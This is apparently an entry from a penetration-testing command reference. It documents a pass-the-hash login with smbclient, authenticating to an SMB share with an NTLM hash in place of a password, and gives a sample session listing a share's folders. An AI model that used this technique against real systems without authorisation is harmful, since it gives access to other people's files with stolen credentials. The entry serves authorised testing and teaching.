---
id: 64c9cbc5-2533-426d-80de-04ae7e5be6a1
name: smbclient Connect to an SMB Share (NTLM)
type: command
executor: bash
data: smbclient -U $_USERNAME%$_NTLM_HASH:$_NTLM_HASH --pw-nt-hash //$_TARGET_IP/$_SHARE_NAME
output: "root@kali:~# smbclient -U bob%43239e3a0af748020d5b426a4977d7e5 --pw-nt-hash\
  \ //10.10.10.10/Users\nTry \"help\" to get a list of possible commands.\nsmb: \\\
  > ls\n  .                                  DR        0  Tue Sep 17 13:19:57 2019\n\
  \  ..                                 DR        0  Tue Sep 17 13:19:57 2019\n  Default\
  \                           DHR        0  Tue Jul 14 03:17:20 2009\n  desktop.ini\
  \                       AHS      174  Tue Jul 14 00:41:57 2009\n  Public       \
  \                      DR        0  Mon Apr 11 22:24:18 2011\n  bob            \
  \                     D        0  Tue Sep 17 13:20:06 2019\n\n                15728127\
  \ blocks of size 4096. 13836018 blocks available"
created_at: '2019-09-18T01:44:02.127015+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# smbclient Connect to an SMB Share (NTLM)

```bash
smbclient -U $_USERNAME%$_NTLM_HASH:$_NTLM_HASH --pw-nt-hash //$_TARGET_IP/$_SHARE_NAME
```

## Expected Output

```
root@kali:~# smbclient -U bob%43239e3a0af748020d5b426a4977d7e5 --pw-nt-hash //10.10.10.10/Users
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Tue Sep 17 13:19:57 2019
  ..                                 DR        0  Tue Sep 17 13:19:57 2019
  Default                           DHR        0  Tue Jul 14 03:17:20 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:41:57 2009
  Public                             DR        0  Mon Apr 11 22:24:18 2011
  bob                                 D        0  Tue Sep 17 13:20:06 2019

                15728127 blocks of size 4096. 13836018 blocks available
```
